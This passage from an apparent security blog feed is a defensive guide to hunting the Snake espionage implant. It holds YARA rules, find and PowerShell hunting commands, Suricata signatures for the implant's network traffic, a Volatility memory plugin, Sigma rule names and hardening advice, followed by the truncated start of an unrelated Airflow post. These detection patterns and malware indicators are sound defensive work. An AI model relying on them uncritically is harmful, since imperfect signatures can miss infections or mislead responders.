    &amp;#39;.*\/system32/Com/comadmin\.dat&amp;#39; \
     -exec yara 1.yar {} \;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;PowerShell&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
    $_.FullName -match &amp;#39;(?i)/system32/Com/comadmin\.dat$&amp;#39;
} | ForEach-Object {
    yara 1.yar $_.FullName
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;On the other end, the Werfault executable can be retrieved due to its use of non-standard icon-size and by using the information and the Yara rule stated below:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; Werfault.exe&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path:&lt;/strong&gt; %windows%\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Unique Characteristics:&lt;/strong&gt; Icon is different than that of a valid Windows Werfault.exe file&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Role:&lt;/strong&gt; Persistence mechanism&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;rule PeIconSizes
{
    meta:
        description = &amp;#34;werfault rule&amp;#34;

    condition:
        pe.is_pe 
        and 
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)
        and
        for any rsrc in pe.resources:
            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336)
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Several tools can be used for the above-mentioned rules. Often SOC/SIEM platforms offer capabilities to automate this process once a blueprint of the hunt has been developed and integrated.&lt;/p&gt;
&lt;p&gt;If you currently don&amp;rsquo;t have any detection and response tooling, we recommend deploying one of the excellent open-source tools available online (we regularly use &lt;a href=&#34;https://github.com/Velocidex/velociraptor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Velociraptor&lt;/a&gt;) to perform a hunt in your estate can integrate well with host-based hunting, allowing you to identify and respond to threats in conjunction with the techniques and rules mentioned above.&lt;/p&gt;
&lt;h2&gt;Network-based Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;network-based-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#network-based-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Network-based detection enables high-confidence for large-scale (network-wide) detection of custom Snake communication protocols. However, there is low visibility of Snake implant operations and encrypted data in transit.  Snake http, http2, and tcp signatures also potentially produce false positives and Snake operators can easily change network-based signatures.&lt;/p&gt;
&lt;p&gt;To counteract this, JUMPSEC recommend implementing Suricata rules to your NIDS appliances the following rules will enable you to detect http, http2 and tcp communication as leveraged by the implant. Further details can also be found within the &lt;a href=&#34;https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;advisory&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Snake http rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following RegEx can be used to build rules matching the http and http2 traffic contained within the HTTP header field.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;^[0-9A-Za-z]{10}[0-9A-Za-z/\&amp;#43;]{11}=&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Which can be used in a Suricata rule as follows:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/C&amp;#34;;\
    flow: established, to_server;\
    sid: 7; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{10}[0-9A-Za-z\/\&amp;#43;]{11}=/H&amp;#34;;\
    flow: established, to_server;\
    sid: 8; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake http2 rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-http2-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-http2-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;For http2, the implant’s header is encoded using base62 with non-extraneous characters. The following RegEx should be able to identify matches of such a header:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;      ^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11}
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Cookie)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/C&amp;#34;;\
    flow: established, to_server;\
    sid: 9; rev: 1;)
alert http any any -&amp;gt; any any (msg: &amp;#34;http2 rule (Other Header)&amp;#34;;\
    pcre:&amp;#34;/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/H&amp;#34;;\
    flow: established, to_server;\
    sid: 10; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Snake tcp rule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;snake-tcp-rule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#snake-tcp-rule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following rule helps capture the signature set during the client-to-server communication for tcp, which usually starts with “ustart”, as well as subsequent data flows that match the malware’s behaviour.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 12;\
    flow: established, to_server; flowbits: set, a8; flowbits: noalert;\
    sid: 1; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize:8;\
    flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\
    flowbits: set, a4; flowbits: noalert;\
    sid: 2; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 08|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\
    flowbits: set, b81; flowbits: noalert;\
    sid: 3; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 8; flow: established, to_client; flowbits: isset, b81;\
    flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\
    sid: 4; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    content: &amp;#34;|00 00 00 04|&amp;#34;; startswith; dsize: 4;\
    flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\
    flowbits: set, b41; flowbits: noalert;\
    sid: 5; rev: 1;)
alert tcp any any -&amp;gt; any any (msg: &amp;#34;tcp rule&amp;#34;;\
    dsize: 4; flow: established, to_client; flowbits: isset, b41;\
    flowbits: unset, b41;\
    sid: 6; rev: 1;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Memory Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;memory-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#memory-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Memory analysis also enables a high degree of detection confidence as memory provides the greatest level of visibility into Snake’s behaviour and artifacts. However, it has the potential to impact system stability, is difficult to scale, and can be a time-consuming process.&lt;/p&gt;
&lt;p&gt;The joint advisory suggests the following as the most effective approach to detect the implant on an infected host and it provides a script to be used alongside Volatility and a memory dump of the target infected machine.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# This plugin to identify the injected usermode component of Snake is based 
# on the malfind plugin released with Volatility3
#
# This file is Copyright 2019 Volatility Foundation and licensed under the 
# Volatility Software License 1.0
# which is available at https://www.volatilityfoundation.org/license/vsl-v1.0
import logging
from typing import Iterable, Tuple
from volatility3.framework import interfaces, symbols, exceptions, renderers
from volatility3.framework.configuration import requirements
from volatility3.framework.objects import utility
from volatility3.framework.renderers import format_hints
from volatility3.plugins.windows import pslist, vadinfo
vollog = logging.getLogger(__name__)
class snake(interfaces.plugins.PluginInterface):
    _required_framework_version = (2, 4, 0)
    
    @classmethod
    def get_requirements(cls):
        return [
            requirements.ModuleRequirement(name = &amp;#39;kernel&amp;#39;, 
            description = &amp;#39;Windows kernel&amp;#39;, 
            architectures = [&amp;#34;Intel32&amp;#34;, &amp;#34;Intel64&amp;#34;]),
            requirements.VersionRequirement(name = &amp;#39;pslist&amp;#39;, 
            component = pslist.PsList, version = (2, 0, 0)),
            requirements.VersionRequirement(name = &amp;#39;vadinfo&amp;#39;, 
            component = vadinfo.VadInfo, version = (2, 0, 0))]

    @classmethod
    def list_injections(
            cls, context: interfaces.context.ContextInterface, 
            kernel_layer_name: str, symbol_table: str,
            proc: interfaces.objects.ObjectInterface) -&amp;gt; Iterable[
            Tuple[interfaces.objects.ObjectInterface, bytes]]:
        proc_id = &amp;#34;Unknown&amp;#34;
        try:
            proc_id = proc.UniqueProcessId
            proc_layer_name = proc.add_process_layer()
        except exceptions.InvalidAddressException as excp:
            vollog.debug(&amp;#34;Process {}: invalid address {} in layer {}&amp;#34;.
            format(proc_id, excp.invalid_address, excp.layer_name))
            return
        proc_layer = context.layers[proc_layer_name]
        for vad in proc.get_vad_root().traverse():
            protection_string = vad.get_protection(vadinfo.VadInfo.
            protect_values(context, kernel_layer_name, symbol_table), 
            vadinfo.winnt_protections)
            if not &amp;#34;PAGE_EXECUTE_READWRITE&amp;#34; in protection_string:
                continue

            if (vad.get_private_memory() == 1
                    and vad.get_tag() == &amp;#34;VadS&amp;#34;) or (vad.get_private_memory() 
                    == 0 and protection_string != 
                    &amp;#34;PAGE_EXECUTE_WRITECOPY&amp;#34;):
                data = proc_layer.read(vad.get_start(), 
                vad.get_size(), pad = True)
                if data.find(b&amp;#39;\x4d\x5a&amp;#39;) != 0:
                    continue
                yield vad, data

    def _generator(self, procs):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        is_32bit_arch = not symbols.symbol_table_is_64bit(self.context, 
        kernel.symbol_table_name)
        for proc in procs:
            process_name = utility.array_to_string(proc.ImageFileName)
            for vad, data in self.list_injections(self.context, 
            kernel.layer_name, kernel.symbol_table_name, proc):
                strings_to_find = [b&amp;#39;\x25\x73\x23\x31&amp;#39;,b&amp;#39;\x25\x73\x23\x32&amp;#39;,
                b&amp;#39;\x25\x73\x23\x33&amp;#39;,b&amp;#39;\x25\x73\x23\x34&amp;#39;, 
                b&amp;#39;\x2e\x74\x6d\x70&amp;#39;, b&amp;#39;\x2e\x73\x61\x76&amp;#39;,
                b&amp;#39;\x2e\x75\x70\x64&amp;#39;]
                if not all(stringToFind in data for 
                stringToFind in strings_to_find):
                    continue
                yield (0, (proc.UniqueProcessId, process_name, 
                format_hints.Hex(vad.get_start()),
                           format_hints.Hex(vad.get_size()),
                           vad.get_protection(
                               vadinfo.VadInfo.protect_values(self.context, 
                kernel.layer_name, kernel.symbol_table_name), 
                vadinfo.winnt_protections)))
                return

    def run(self):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        return renderers.TreeGrid([(&amp;#34;PID&amp;#34;, int), (&amp;#34;Process&amp;#34;, str), 
        (&amp;#34;Address&amp;#34;, format_hints.Hex), (&amp;#34;Length&amp;#34;, format_hints.Hex), 
        (&amp;#34;Protection&amp;#34;, str)], self._generator(pslist.PsList.list_processes(
        context = self.context, layer_name = kernel.layer_name,  
        symbol_table = kernel.symbol_table_name)))&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Security researchers are currently developing detections and rules to speed up the memory analysis process. For example, Matt Suiche, Director of Incident Response R&amp;amp;D at Magnet Forensics (MAGT:TO), has recently developed a &lt;a href=&#34;https://gist.github.com/msuiche/8c8fd278430dda0292b4cfdfc549ca2d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;YARA rule&lt;/a&gt; based on the above Volatility plugin to look into memory and identify snake.&lt;/p&gt;
&lt;h2&gt;Other Detection Mechanisms and Sigma Rules&lt;span class=&#34;absolute -mt-20&#34; id=&#34;other-detection-mechanisms-and-sigma-rules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#other-detection-mechanisms-and-sigma-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Researchers at the open-source project SigmaHQ have also started developed rules that will help hunt for the malware and detect when it performs malicious operations in the network which can be found &lt;a href=&#34;https://github.com/SigmaHQ/sigma/pull/4231/files&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As of now, the rules currently developed include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Kernel Driver File Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware Installer Name Indicators&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware WerFault Persistence File Creation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Installation CLI Arguments Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Installation Binary Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Persistence Service Execution&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Covert Store Registry Key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential Encrypted Registry Blob Related To SNAKE Malware&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Service Persistence&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Should a different set of rules be needed for your specific EDR or SOC/SIEM it is possible to utilise the extremely helpful open-source resource &lt;a href=&#34;https://uncoder.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Uncoder&lt;/a&gt; to convert rules.&lt;/p&gt;
&lt;h1&gt;Long-term prevention&lt;/h1&gt;&lt;p&gt;If you believe your organisation is at risk, JUMPSEC recommends building an Incident Response Plan and a dedicated team to monitor and effectively respond to the threats posed by Snake, in order to meaningfully utilise and validate the detection techniques outlined above.&lt;/p&gt;
&lt;p&gt;To ensure that implemented detections are effective JUMPSEC recommends:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Using Atomic Red Team and Purple Team approaches to ingest and execute techniques used by Snake in your network to identify gaps in detection capabilities. For Purple Team Testing, security researchers at Red Canary have already started developing open-source Atomic Red Team test cases to simulate Snake which can be found &lt;a href=&#34;https://github.com/redcanaryco/atomic-red-team/pull/2418&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Actively hunting for Snake malware using endpoint and network detection tooling. Third party security providers such as JUMPSEC can assist with deployment and integration with existing detection and response platforms to monitor and prioritise critical instances of malicious activity.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploying Canary Tokens in your estate where possible. Canary Tokens can serve as early warning systems as part of your organisations broader security strategy.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ensuring you have an adequate incident response plan that is ready to deploy. This may include baselining or reviewing existing response processes and procedures. In the event that a Snake is identified, incident response plans can be triggered, affected hosts quarantined, back-up systems deployed, and any other steps deemed necessary to secure the environment can be taken.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additionally, Snake typically achieves network intrusion by exploiting vulnerable, publicly available infrastructure via targeted phishing and social engineering campaigns, meaning that organisations should rigorously review potential vulnerabilities in externally facing assets.&lt;/p&gt;
&lt;h2&gt;MFA and credential management&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mfa-and-credential-management&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mfa-and-credential-management&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As an FSB espionage tool gathering credentials for up to 20 years, JUMPSEC would additionally echo that organisations who have not already embedded standard best practice when it comes to MFA and credential management should implement appropriate measures. For example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Change account credentials to values which cannot be brute forced or guessed based on old passwords, requiring minimum password strengths and unique credentials for every account.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use appropriate role separation, account permissions and separate user and privileged accounts.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Implement phishing-resistant MFA or go passwordless if possible (Biometrics and FIDO2 keys).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploy digitally signed Security.txt files to all public facing web domains which conform to the recommendations in RFC 9118.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a final note, JUMPSEC recommend reporting any Indicators of Compromise (IoCs) to the relevant authorities (NCSC for UK based organisations), as well as the wider security community where appropriate.&lt;/p&gt;
&lt;h2&gt;Helpful Links&lt;span class=&#34;absolute -mt-20&#34; id=&#34;helpful-links&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#helpful-links&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CISA Advisory - &lt;a href=&#34;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&lt;/a&gt;_snake_malware_1.pdf&lt;/li&gt;
&lt;li&gt;RFC 9118 - &lt;a href=&#34;https://datatracker.ietf.org/doc/rfc9118/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://datatracker.ietf.org/doc/rfc9118/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Canary Tokens - &lt;a href=&#34;https://canarytokens.org/generate&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://canarytokens.org/generate&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Guide to setup security.exe - &lt;a href=&#34;https://securitytxt.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://securitytxt.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Mitre - &lt;a href=&#34;https://attack.mitre.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://attack.mitre.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;SigmaHQ rules - &lt;a href=&#34;https://github.com/SigmaHQ/sigma&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/SigmaHQ/sigma&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>Implementation and Dynamic Generation for Tasks in Apache Airflow&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</link>
      <pubDate>Wed, 23 Nov 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</guid>
      <description>
        
        
        &lt;p&gt;I recently worked on a project focused on log anomaly detection using manageable machine learning pipelines. The pipelines mainly include &lt;strong&gt;data collection &amp;mdash; feature extraction &amp;mdash; feature engineering &amp;mdash; detection/prediction &amp;mdash; updating (maintenance)&lt;/strong&gt;. &lt;/p&gt;
&lt;p&gt;It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended &lt;a href=&#34;https://airflow.apache.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;In airflow, the core concept is the &lt;strong&gt;Directed Acyclic Graph&lt;/strong&gt; (DAG). Through the implementation, I have confirmed that this is a truly powerful tool to manage the machine learning pipelines, instead of relying on shell scripts. But, I did encounter some challenges during the process and also, fortunately, found solutions for them. &lt;/p&gt;
&lt;p&gt;The challenges can be split into two main aspects, &lt;strong&gt;pipeline management&lt;/strong&gt; and &lt;strong&gt;dynamic generation for tasks&lt;/strong&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pipeline management -&lt;/strong&gt; During the process of solving the problem about pipeline management, I met the following problems when implementing the machine learning pipelines in Airflow:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies within one DAG&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies between Dags&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome known issues with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/howto/operator/external_task_sensor.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome issues with the &lt;strong&gt;execution time&lt;/strong&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
